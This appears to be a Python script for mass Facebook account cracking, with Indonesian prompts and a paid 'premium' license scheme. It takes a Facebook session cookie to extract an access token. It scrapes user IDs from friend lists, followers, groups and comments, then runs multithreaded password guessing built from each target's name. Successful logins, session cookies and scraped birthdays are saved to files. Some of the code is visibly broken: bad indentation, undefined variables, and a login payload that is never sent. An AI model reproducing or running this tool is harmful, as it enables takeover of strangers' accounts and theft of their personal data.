# cython: language_level=3str
# cython: auto_pickle=False
import os, sys, re, time, requests, calendar, random, bs4, uuid, subprocess
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from datetime import datetime
from datetime import date
from urllib.parse import quote

loop = 0
id = []
ok = []
cp = []
ct = datetime.now()
n = ct.month
bulan = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]
try:
	if n < 0 or n > 12:
		exit()
	nTemp = n - 1
except ValueError:
	exit()
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
my_date = date.today()
hr = calendar.day_name[my_date.weekday()]
cv_hr = {"Sunday":"Minggu", "Monday":"Senin", "Tuesday":"Selasa", "Wednesday":"Rabu", "Thursday":"Kamis", "Friday":"Jumat", "Saturday":"Sabtu"}
nama_hari = cv_hr[hr]
tanggal = ("%s-%s-%s-%s"%(nama_hari, ha, op, ta))
tgl = ("%s %s %s"%(ha, op, ta))
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"};
bulan_x = {"january": "Januari", "february": "Februari", "march": "Maret", "april": "April", "may": "Mei", "june": "Juni", "july": "Juli", "august": "Agustus", "september": "September", "october": "Oktober", "november": "November", "december": "Desember"}

class Logo:
	def __init__(self):
		os.system("clear")

#class GetData:
	#def __init__(self):
		#try:
			#key = open(".license.log","r").read()
			#status = a["member"];
			#open(".status.log", "w").write(status)
			#expday, expmonth, expyear = exp.split(" ");
			#expmonth = bulan_x[expmonth]
		#except KeyError:
			#exp = ""
			#expday = "null";expmonth = "";expyear = ""
			#status = "Trial";open(".status.log", "w").write(status)
		#except ValueError:
			##exit(" [!] terjadi kesalahan tidak dapat terhubung ke server ASTA.")
		#try:
			#status = "Trial";open(".status.log", "w").write(status)
		#except ValueError:
			#exit(" [!] terjadi kesalahan tidak dapat terhubung ke server ASTA.")
		#try:
			#rkey = key.split("-")
			#key = ("%sxxx-%s***-%sxx***-%sxx"%(rkey[0][:4], rkey[1][:2], rkey[2][:1], rkey[3][:5]))
		#except ValueError:
			#exit(" [!] terjadi kesalahan tidak dapat terhubung ke server ASTA.")
		#try:
			#rkey = key.split("-")
			#key = ("%sxxx-%s***-%sxx***-%sxx"%(rkey[0][:4], rkey[1][:2], rkey[2][:1], rkey[3][:5]))
		#except ValueError:
			#exit(" [!] terjadi kesalahan tidak dapat terhubung ke server ASTA.")
		#except IndexError:
			#os.system("rm .license.log")
			#exit("\n [!] tidak terdeteksi api key, silakan jalankan ulang script ini")
		ip = requests.get("http://ip-api.com/json/").json()["query"]
		#print("  > License   : %s"%(key))
		#print("  > Expired   : %s %s %s"%(expday, expmonth, expyear))
		#print("  > Your IP   : %s"%(ip))

#class Main:
	#def __init__(self):
		#try:os.mkdir("OK");os.mkdir("CP")
		#except:pass
		#try:
			#key = open(".license.log","r").read()
			#CekVersi()
		#except (KeyError, IOError):
			#serial1 = uuid.uuid4().hex[:7]
			#serial2 = uuid.uuid4().hex[:6]
			#serial3 = uuid.uuid4().hex[:5]
			#serial4 = uuid.uuid4().hex[:8]
			#serial = ("%s-%s-%s-%s"%(serial1, serial2, serial3, serial4))
			#open(".license.log","w").write(serial)
			#CekVersi()

#class CekVersi:
	#def __init__(self):
		#try:
			#v = open(".version.log", "r").read()
			#version = requests.get("https://astaxd.my.id/version.txt", headers={"user-agent":"Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"}).text
			#if "%s"%(version) in v:
				#Login()
			#else:
				#print(" [!] terdapat pembaruan pada script ini")
				#ask = input(" [?] silakan anda update script ini [Y/t]: ")
				#if ask in ["Y", "y"]:
					#os.system("git pull")
					#os.system("rm -f *.so")
					#os.system("cythonize -i *.c")
					#open(".version.log","w").write(version)
				#else:
					#exit("\n [!] anda harus melakukan pembaruan pada script ini")
		#except IOError:
			#version = requests.get("https://astaxd.my.id/version.txt", headers={"user-agent":"Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"}).text
			#open(".version.log","w").write(version)
			#CekVersi()
		#except ValueError:
			#exit(" [!] terjadi kesalahan tidak dapat terhubung ke server ASTA.")

class Login:
	def __init__(self):
		try:
			token = open("token.txt","r").read()
			Menu()
		except (KeyError, IOError):
			Cookies()

class Cookies:
	def __init__(self):
		Logo()
		print("  > cara mendapatkan cookie facebook : \033[0;92mhttps://youtu.be/DeYroqSeJxQ\033[0;97m")
		cok = input("\n [+] cookie fb : ")
		if cok in ["", " "]:
			exit("\n [!] isi yang benar jangan kosong bro")
		try:
			data = requests.get("https://business.facebook.com/creatorstudio/home", headers = {"user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36", "cookie":cok})
			find_token = re.search('{"accessToken":"(EAA\w+)',data.text)
			open("token.txt", "w").write(find_token.group(1))
			open("cookie.txt", "w").write(cok)
			time.sleep(1)
			Menu()
		except Exception as e:
			os.system("rm -f token.txt cookie.txt")
			exit("\n [!] cookie kadaluwarsa")
def logo():
    print("""%s
   
 \x1b[1;92m ___ ___ ___ __  __ ___ _   _ __  __ 
 \x1b[1;92m| _ \ _ \ __|  \/  |_ _| | | |  \/  |  
 \x1b[1;92m|  _/   / _|| |\/| || || |_| | |\/| |   
 \x1b[1;92m|_| |_|_\___|_|  |_|___|\___/|_|  |_| 
 """%(N))  


class Menu:
	def __init__(self):
		Logo()
		#GetData()
		try:
			token = open("token.txt","r").read()
			cok = open("cookie.txt","r").read()
			#key = open(".license.log","r").read()
			nama = requests.get("https://graph.facebook.com/me/?access_token="+token).json()["name"]
		except (KeyError, IOError):
			os.system("rm -f token.txt cookie.txt")
			print(" [!] sepertinya akun anda terkena checkpoint")
			time.sleep(1)
			Login()
		except requests.exceptions.ConnectionError:
			exit(" [!] terjadi kesalahan pada koneksi internet anda")
		print("  > Your Name : \033[0;93m%s\033[0;97m\n"%(nama))
		print(" [1] crack dari publik teman")
		print(" [2] crack dari pengikut publik")
		print(" [3] crack dari target massal")
		print(" [4] crack dari member group")
		print(" [5] crack dari komentar post")
		print(" [6] crack dari permintaan teman")
		print(" [7] lihat jumlah teman")
		print(" [8] lihat hasil crack")
		print(" [9] beli masa aktif")
		print("\n  > ketik '\033[0;92mchange\033[0;97m' untuk ganti license")
		print("  > ketik '\033[0;91mout\033[0;97m' untuk logout (hapus cookie)")
		ask = input("\n [?] choose : ")
		#if ask in ["1", "01"]:
			#print(" [!] \033[0;91mTRIAL\033[0;97m user hanya dapat 1000 id.\n")
	    elif ask in ["1", "01"]:
         DumpPublic(token)
			Crack()
		elif ask in ["2", "02"]:
		#elif ask in ["2", "02"]:
			#print(" [!] \033[0;91mTRIAL\033[0;97m user hanya dapat 1000 id.\n")
			DumpPengikut(token)
			Crack()
		elif ask in ["7", "07"]:
			CekJumlahTeman(token)
		elif ask in ["8", "08"]:
			LihatHasil()
		elif ask in ["9", "09"]:
			BeliPrem(key)
		#elif ask in ["change"]:
			#key = input(" [+] masukan license : ")
			#os.system("rm .license.log")
			#open(".license.log","w").write(key)
			#exit("\n [!] berhasil mengganti license")
		elif ask in ["out"]:
			os.system("rm token.txt cookie.txt")
			exit(" [!] berhasil logout (hapus cookie)")
		else:
			exit("\n [!] kamu perlu upgrade ke premium terlebih dahulu")
		st = open(".status.log", "r").read()
class CekJumlahTeman:
	def __init__(self, token):
		tt = []
		te = []
		no = 0
		print(" [*] isi 'me' jika ingin lihat jumlah teman")
		user = input(" [+] masukan username atau id : ")
		if user in [""]:exit("\n [!] mohon isi yang benar jangan kosong")
		elif user in ["me"]:idt = "me"
		elif(re.findall("\w+",user)):
			r = requests.get("https://m.facebook.com/"+user).text
			try:idt = re.findall('\;rid\=(\d+)\&',str(r))[0]
			except:exit("\n [!] akun tidak tersedia atau list teman private")
		try:limit = int(input("\n [?] masukan limit id (cth:5000) : "))
		except ValueError:exit("\n [!] masukan angka yang benar")
		print(" [!] tunggu sebentar sedang proses\n")
		idi = requests.get("https://graph.facebook.com/%s/friends?limit=%s&access_token=%s"%(idt, limit, token)).json()
		for x in idi["data"]:tt.append(x["id"])
		for id in tt:
			try:
				idi2 = requests.get("https://graph.facebook.com/%s/friends?limit=5000&access_token=%s"%(id, token)).json()
				try:
					for b in idi2["data"]:te.append(b["id"])
				except KeyError:exit("\n [!] IP anda terkena block oleh facebook")
				no +=1
				print("  > %s|%s teman"%(id, len(te)))
				te.clear()
			except KeyError:exit("\n [!] IP anda terkena block oleh facebook")
		input("\n [#] selesai...")

class LihatHasil:
	def __init__(self):
		print("\n [1] hasil crack OK")
		print(" [2] hasil crack CP")
		ask = input("\n [?] choose : ")
		if ask in ["1"]:
			dirs = os.listdir("OK")
			print(" [*] list nama file tersimpan di folder OK\n")
			for file in dirs:print(" [+] "+file)
			try:
				file = input("\n [?] pilih nama file : ")
				if file == "":Menu()
				totalok = open("OK/%s"%(file)).read().splitlines()
			except IOError:exit(" [!] file %s tidak tersedia"%(file))
			nm_file = ("%s"%(file)).replace("-", " ");del_txt = nm_file.replace(".txt", "")
			print(" [#] ----------------------------------------------")
			os.system("cat OK/%s"%(file))
			print("\033[0;97m [#] ----------------------------------------------")
			print(" [#] ----------------------------------------------")
			print(" [+] hasil crack : %s total : %s\033[0;92m"%(del_txt, len(totalok)))
			print("\033[0;97m [#] ----------------------------------------------")
			exit(" [!] jangan lupa di copy dan di simpan hasilnya")
		elif ask in ["2"]:
			dirs = os.listdir("CP")
			print(" [*] list nama file tersimpan di folder CP\n")
			for file in dirs:print(" [+] "+file)
			try:
				file = input("\n [?] pilih nama file : ")
				if file == "":Menu()
				totalcp = open("CP/%s"%(file)).read().splitlines()
			except IOError:exit(" [!] file %s tidak tersedia"%(file))
			nm_file = ("%s"%(file)).replace("-", " ");del_txt = nm_file.replace(".txt", "")
			print(" [#] ----------------------------------------------")
			print(" [+] hasil crack : %s total : %s\033[0;93m"%(del_txt, len(totalcp)))
			os.system("cat CP/%s"%(file))
			print("\033[0;97m [#] ----------------------------------------------")
			exit(" [!] jangan lupa di copy dan di simpan hasilnya")
		else:Menu()

class DumpGroup:
	def __init__(self, token, cok):
		self.getmem(token, cok)

	def getmem(self, token, cok):
		no = 0
		id_group = []
		kue = {"cookie":cok}
		for i in requests.get("https://graph.facebook.com/me/groups?access_token=%s"%(token)).json()["data"]:
			try:
				id_group.append(i["id"])
				no +=1
			except:pass
			print(" [%s] %s"%(str(no), i["name"]))
		for idg in id_group:
			try:
				print("")
				url_group = "https://mbasic.facebook.com/browse/group/members/?id="+idg
				self.group(kue, url_group)
			except KeyboardInterrupt:break


	def group(self, kue, url_group):
		try:
			sop_dev = parser(requests.get(url_group, cookies=kue).content, "html.parser")
			members = sop_dev.find("div", id="objects_container")
			for dev in members.find_all("table"):
				user_ = dev["id"].replace("member_", "")
				nama_ = re.findall('<img alt="(.*), profile picture"', str(dev))[0]
				try:id.append(str(user_)+"<=>"+str(nama_))
				except:pass
				sys.stdout.write("\r [*] sedang mengumpulkan %s id..."%(len(id))); sys.stdout.flush()
			if "Lihat Selengkapnya" in str(sop_dev):
				url = sop_dev.find("a", string="Lihat Selengkapnya")["href"]
				url_grup = "https://mbasic.facebook.com"+url
				self.group(kue, url_grup)
		except:pass

class DumpPublic:
	def __init__(self, token):
		#st = open(".status.log", "r").read()
		if "Premium" in st:
			jumlah = "5000"
		else:
			jumlah = "5000"
		print(" [*] isi 'me' jika ingin dari daftar teman")
		user = input(" [+] masukan username atau id : ")
		if user in [""]:
			exit("\n [!] isi yang benar jangan kosong bro")
		elif(re.findall("\w+",user)):
			r = requests.get("https://m.facebook.com/"+user).text
			try:idt = re.findall('\;rid\=(\d+)\&',str(r))[0]
			except:idt = user
		try:
			for i in requests.get("https://graph.facebook.com/%s/friends?limit=&access_token=%s"%(idt, token)).json()["data"]:
				id.append(i["id"]+"<=>"+i["name"])
		except KeyError:
			exit("\n [!] akun tidak tersedia atau list teman private")
		if len(id) == 0:
			exit("\n [!] akun tidak tersedia atau list teman private")
		print("\n [+] total id -> \033[0;91m%s\033[0;97m"%(len(id)))

class DumpPengikut:
	def __init__(self, token, key):
		st = open(".status.log", "r").read()
		if "Premium" in st:
			jumlah = "5000"
		else:
			jumlah = "5000"
		user = input(" [+] masukan username atau id : ")
		if user in [""]:
			exit("\n [!] isi yang benar jangansilvi.silva.399 kosong bro")
		elif(re.findall("\w+",user)):
			r = requests.get("https://m.facebook.com/"+user).text
			try:idt = re.findall('\;rid\=(\d+)\&',str(r))[0]
			except:idt = user
		try:
			for i in requests.get("https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s"%(idt, jumlah, token)).json()["data"]:
				id.append(i["id"]+"<=>"+i["name"])
		except KeyError:
			exit("\n [!] akun tidak tersedia atau list teman private")
		if len(id) == 0:
			exit("\n [!] akun tidak tersedia atau list teman private")
		print("\n [+] total id -> \033[0;91m%s\033[0;97m"%(len(id)))

class DumpMassal:
	def __init__(self, token, key):
		st = open(".status.log", "r").read()
		if "Premium" in st:
			jumlah = "5000"
		else:
			jumlah = "5000"
		try:tanya_total = int(input(" [+] jumlah target id : "))
		except:tanya_total=1
		print("\n [*] isi 'me' jika ingin dari daftar teman")
		for t in range(tanya_total):
			t +=1
			user = input(" [+] masukan username atau id %s : "%(t))
			if user in [""]:
				exit("\n [!] isi yang benar jangan kosong bro")
			elif(re.findall("\w+",user)):
				r = requests.get("https://m.facebook.com/"+user).text
				try:idt = re.findall('\;rid\=(\d+)\&',str(r))[0]
				except:idt = user
			try:
				for i in requests.get("https://graph.facebook.com/%s/friends?limit=%s&access_token=%s"%(idt, jumlah, token)).json()["data"]:
					id.append(i["id"]+"<=>"+i["name"])
			except KeyError:
				print("\n [!] akun tidak tersedia atau list teman private")
		if len(id) == 0:
			print("\n [!] akun tidak tersedia atau list teman private")
		print("\n [+] total id -> \033[0;91m%s\033[0;97m"%(len(id)))

class DumpKomen:
	def __init__(self, url):
		cok = open("cookie.txt").read()
		kue = {"cookie":cok}
		urlmain = requests.get(url,cookies=kue).text.encode("utf-8")
		par = parser(urlmain,"html.parser")
		try:
			for xf in par.find_all("h3"):
				for xx in xf.find_all("a",href=True):
					try:
						if "profile.php" in xx.get("href"):
							z = xx.get("href").split("=")[1]
							x = z.split("&")[0]
							uid = xx.text
							id.append(x+"<=>"+uid)
							sys.stdout.write("\r [*] sedang mengumpulkan %s id..."%(len(id))); sys.stdout.flush()
					except:pass
			for n in par.find_all("a",href=True):
				if "Lihat komentar lainnya" in n.text:
					DumpKomen("https://mbasic.facebook.com/"+n.get("href"))
			if len(id) == 0:
				exit("\n [!] tidak ada komentar atau post tidak private")
		except KeyboardInterrupt:
			print("")
			Crack()

class DumpFL:
	def __init__(self, url):
		cok = open("cookie.txt").read()
		kue = {"cookie":cok}
		s = parser(requests.get(url, cookies=kue).text, "html.parser")
		try:
			for x in s.find_all("a",href=True):
				if "/friends/hovercard" in x.get('href'):
					nama = x.text
					idx = "".join(bs4.re.findall('uid=(.*?)&',x.get('href')))
					id.append(idx+"<=>"+nama)
				sys.stdout.write("\r [*] sedang mengumpulkan %s id..."%(len(id))); sys.stdout.flush()
			for x in s.find_all("a",href=True):
				if "Lihat selengkapnya" in x.text:
					self.s_dump("https://mbasic.facebook.com/"+x.get('href'))
		except KeyboardInterrupt:
			print("")
			Crack()

class BeliPrem:
	def __init__(self, key):
		print("  > license anda : %s\n"%(key))
		print(" [*] informasi harga : ")
		print("  > durasi 1 minggu -> Rp 25.000 (\033[0;91mpromo\033[0;97m)")
		print("  > durasi 1 bulan  -> Rp 50.000")
		print("  > durasi 2 bulan  -> Rp 100.000")
		nowa = requests.get("https://astaxd.my.id/wa.txt", headers={"user-agent":"Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"}).text
		url_wa = "https://api.whatsapp.com/send?phone=%s&text="%(nowa)
		tks = "hallo admin saya ingin beli license premium\n\n > license saya : *%s*"%(key)
		subprocess.check_output(["am", "start", url_wa+quote(tks)])
		exit("\n [!] anda di arahkan ke whatsapp admin")

class CekOpsi:
	def __init__(self):
		ask = input(" [?] apakah anda ingin cek opsi hasil crack [Y/t]: ")
		if ask in ["Y", "y"]:
			print(" [*] tunggu sebentar sedang proses masuk kedalam akun")
			for memek in cp:
				kontol = memek.replace("\n","")
				titid  = kontol.split("|")
				print("\n [*] cek opsi akun : \033[0;93m%s\033[0;97m"%(kontol))
				try:self.check_in(titid[0], titid[1])
				except requests.exceptions.ConnectionError:pass
				except requests.exceptions.ConnectionError:pass
			exit("\n [#] cek opsi selesai...")
		else:exit()

	def cek_file(self):
		print(" [*] contoh: ex: CP/%s.txt"%(tanggal))
		files = input(" [?] masukan file : ")
		if files == "":Menu()
		try:buka_baju = open(files, "r").readlines()
		except IOError:exit("\n [!] nama file %s tidak ada"%(files))
		print(" [*] tunggu sebentar sedang proses masuk kedalam akun")
		for memek in buka_baju:
			kontol = memek.replace("\n","")
			titid  = kontol.split("|")
			print("\n [*] cek opsi akun : \033[0;93m%s\033[0;97m"%(kontol))
			try:self.check_in(titid[0], titid[1])
			except requests.exceptions.ConnectionError:pass
		exit("\n [#] cek opsi selesai...")

	def check_in(self, user, pasw):
		data = {}
		mb = ("https://mbasic.facebook.com")
		ua = "Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
		ses = requests.Session();ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9"});ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser");fm = ged.find("form",{"method":"post"});list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
		for i in fm.find_all("input"):
			if i.get("name") in list:data.update({i.get("name"):i.get("value")})
			else:continue
		data.update({"email":user,"pass":pasw})
		run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
		if "c_user" in ses.cookies.get_dict():
			if "Akun Anda Dikunci" in run.text:print(" [!] \033[0;91mAkun anda terkunci\033[0;97m")
			else:print(" [!] \033[0;92mAkun aman tidak checkpoint\033[0;97m")
		elif "checkpoint" in ses.cookies.get_dict():
			eax = re.findall("\<title>(.*?)<\/title>",str(run));form = run.find("form");dtsg = form.find("input",{"name":"fb_dtsg"})["value"];jzst = form.find("input",{"name":"jazoest"})["value"];nh = form.find("input",{"name":"nh"})["value"];dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh};xnxx = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
			ngew = [yy.text for yy in xnxx.find_all("option")]
			if(str(len(ngew)) == "0"):
				if "Lihat detail login yang ditampilkan. Ini Anda?" in eax:
					print(" [*] \033[0;92mAkun tap yes, silakan login di fb lite\033[0;97m")
				elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(run)):print(" [!] \033[0;91mAkun authentikasi dua faktor aktif\033[0;97m")

			ngew = [yy.text for yy in xnxx.find_all("option")]
			if(str(len(ngew)) == "0"):
				if "Lihat detail login yang ditampilkan. Ini Anda?" in eax:
					print(" [*] \033[0;92mAkun tap yes, silakan login di fb lite\033[0;97m")
				elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(run)):print(" [!] \033[0;91mAkun authentikasi dua faktor aktif\033[0;97m")

			if(str(len(ngew)) == "0"):
				if "Lihat detail login yang ditampilkan. Ini Anda?" in eax:
					print(" [*] \033[0;92mAkun tap yes, silakan login di fb lite\033[0;97m")
				elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(run)):print(" [!] \033[0;91mAkun authentikasi dua faktor aktif\033[0;97m")
			else:
				print(" [*] terdapat "+str(len(ngew))+" opsi checkpoint")
				for opt in range(len(ngew)):
					print(" ["+str(opt+1)+"] "+ngew[opt])
		elif "login_error" in str(run):
			oh = run.find("div",{"id":"login_error"}).find("div").text
			print(" [!] %s"%(oh))
		else:print(" [!] login gagal, silahkan cek kembali id dan kata sandi")

class Crack:
	def __init__(self):
		ask = input(" [?] apakah anda ingin menggunakan sandi manual? [Y/t]: ")
		if ask in ["", " "]:
			exit("\n [!] isi yang benar jangan kosong bro")
		elif ask in ["y", "Y"]:
			print("\n [!] gunakan , (koma) untuk pemisah contoh : sayang,indonesia,bismillah,dll. setiap kata sandi minimal 6 karaker atau lebih.\n")
			listpw = input(" [?] set kata sandi : ")
			if len(listpw)<=5:
				exit("\n [!] kata sandi minimal 6 karakter")
			print(" [*] crack dengan sandi -> [\033[0;91m%s\033[0;97m]"%(listpw.replace(",",", ")))
			self.text_method()
			method = input("\n [*] method : ")
			if method in ["1", "01"]:
				with ThreadPoolExecutor(max_workers=40) as coeg:
					self.text_crack()
					for user in id:
						uid, name = user.split("<=>")
						coeg.submit(self.API, uid, listpw.split(","))
				print("\n\n [#] crack selesai...")
				CekOpsi()
			elif method in ["2", "02"]:
				with ThreadPoolExecutor(max_workers=40) as coeg:
					self.text_crack()
					for user in id:
						uid, name = user.split("<=>")
						coeg.submit(self.mbasic, uid, listpw.split(","))
				print("\n\n [#] crack selesai...")
				CekOpsi()
			elif method in ["3", "03"]:
				with ThreadPoolExecutor(max_workers=40) as coeg:
					self.text_crack()
					for user in id:
						uid, name = user.split("<=>")
						coeg.submit(self.mobile, uid, listpw.split(","))
				print("\n\n [#] crack selesai...")
				CekOpsi()

		elif ask in ["t", "T"]:
			self.text_method()
			method = input("\n [*] method : ")
			if method in ["1", "01"]:
				with ThreadPoolExecutor(max_workers=40) as coeg:
					
					for user in id:
						try:
							uid, name = user.split("<=>")
							ss = name.split(" ")
							listpw = [ name, ss[0]+ss[1], ss[0]+"123", ss[0]+"12345" ]
							coeg.submit(self.API, uid, listpw)
						except:pass
				print("\n\n [#] crack selesai...")
				CekOpsi()
			elif method in ["2", "02"]:
				with ThreadPoolExecutor(max_workers=40) as coeg:
					
					for user in id:
						try:
							uid, name = user.split("<=>")
							ss = name.split(" ")
							listpw = [ name, ss[0]+ss[1], ss[0]+"123", ss[0]+"12345" ]
							coeg.submit(self.mbasic, uid, listpw)
						except:pass
				print("\n\n [#] crack selesai...")
				CekOpsi()
			elif method in ["3", "03"]:
				with ThreadPoolExecutor(max_workers=40) as coeg:
		
					for user in id:
						try:
							uid, name = user.split("<=>")
							ss = name.split(" ")
							listpw = [ name, ss[0]+ss[1], ss[0]+"123", ss[0]+"12345" ]
							coeg.submit(self.mobile, uid, listpw)
						except:pass
				print("\n\n [#] crack selesai...")
				CekOpsi()
		else:exit()

	def API(self, uid, listpw):
		global ok, cp, loop, token
		sys.stdout.write("\r [*] crack: %s/%s -> OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))); sys.stdout.flush()
		try:
			for pw in listpw:
				pw = pw.lower()
				ses = requests.Session()
				url_API = ("https://b-api.facebook.com/v1.0/method/auth.login?format=json&email=&password=&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true")
				url_Graph = ("https://graph.facebook.com/restserver.php?api_key=882a8490361da98702bf97a021ddc14d&credentials_type=password&email=&format=JSON&generate_machine_id=1&generate_session_cookies=1&locale=en_US&method=auth.login&password=&return_ssl_resources=0&v=1.0&&sig=7a690cf0b70c96a337be44ccc2cfb219")
				ses.headers.update({"Host":"free.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
				r = ses.get("https://free.facebook.com/index.php")
				payload = {"lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),"uid":uid,"flow":"login_no_pin","pass":pw,"next":"https://free.facebook.com/home.php"}
				if "c_user" in ses.cookies.get_dict().keys():
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print("\r  \033[0;92m--> %s|%s|%s\033[0;97m"%(uid, pw, kuki))
					ok.append("%s|%s"%(uid, pw))
					open("OK/%s.txt"%(tanggal),"a").write("  --> %s|%s|%s\n"%(uid, pw, kuki))
					break
					continue
				elif "checkpoint" in ses.cookies.get_dict().keys():
					try:
						token = open("token.txt", "r").read()
						with requests.Session() as ses:
							ttl = ses.get("https://graph.facebook.com/%s?fields=name,id,birthday&access_token=%s"%(uid, token)).json()["birthday"]
							month, day, year = ttl.split("/")
							month = bulan_ttl[month]
							print("\r  \033[0;93m--> %s|%s|%s %s %s\033[0;97m"%(uid, pw, day, month, year))
							cp.append("%s|%s"%(uid, pw))
							open("CP/%s.txt"%(tanggal),"a").write("  --> %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
							break
					except (KeyError, IOError):
						day = (" ")
						month = (" ")
						year = (" ")
					except:pass
			loop +=1
		except:
			self.API(uid, listpw)
			loop +=1

	def mbasic(self, uid, listpw):
		global ok, cp, loop, token
		sys.stdout.write("\r [*] crack: %s/%s -> OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))); sys.stdout.flush()
		try:
			for pw in listpw:
				pw = pw.lower()
				ses = requests.Session()
				ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
				r = ses.get("https://mbasic.facebook.com/index.php")
				payload = {"lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),"uid":uid,"flow":"login_no_pin","pass":pw,"next":"https://mbasic.facebook.com/home.php"}
				if "c_user" in ses.cookies.get_dict().keys():
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print("\r  \033[0;92m--> %s|%s|%s\033[0;97m"%(uid, pw, kuki))
					ok.append("%s|%s"%(uid, pw))
					open("OK/%s.txt"%(tanggal),"a").write("  --> %s|%s|%s\n"%(uid, pw, kuki))
					break
					continue
				elif "checkpoint" in ses.cookies.get_dict().keys():
					try:
						token = open("token.txt", "r").read()
						with requests.Session() as ses:
							ttl = ses.get("https://graph.facebook.com/%s?fields=name,id,birthday&access_token=%s"%(uid, token)).json()["birthday"]
							month, day, year = ttl.split("/")
							month = bulan_ttl[month]
							print("\r  \033[0;93m--> %s|%s|%s %s %s\033[0;97m"%(uid, pw, day, month, year))
							cp.append("%s|%s"%(uid, pw))
							open("CP/%s.txt"%(tanggal),"a").write("  --> %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
							break
					except (KeyError, IOError):
						day = (" ")
						month = (" ")
						year = (" ")
					except:pass
			loop +=1
		except:
			self.mbasic(uid, listpw)

	def mobile(self, uid, listpw):
		global ok, cp, loop, token
		sys.stdout.write("\r [*] crack: %s/%s -> OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))); sys.stdout.flush()
		try:
			for pw in listpw:
				pw = pw.lower()
				ses = requests.Session()
